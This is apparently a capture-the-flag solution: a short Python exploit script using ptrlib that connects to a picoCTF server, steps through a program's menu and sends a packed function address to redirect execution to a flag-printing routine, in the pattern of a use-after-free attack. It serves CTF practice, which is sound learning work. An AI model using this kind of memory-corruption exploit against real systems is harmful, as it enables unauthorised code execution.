from ptrlib import *

hahaexploitgobrrr = 0x80487d6 # print flag function
# sock = Process('./vuln')
sock = Socket('mercury.picoctf.net', 48259)

sock.sendlineafter(b'(e)xit\n', b'I')
sock.sendlineafter(b"You're leaving already(Y/N)?", b'Y')
sock.sendlineafter(b'(e)xit\n', b'l')
sock.recvuntil(b"try anyways:\n")
sock.send(p64(hahaexploitgobrrr))

sock.interactive()
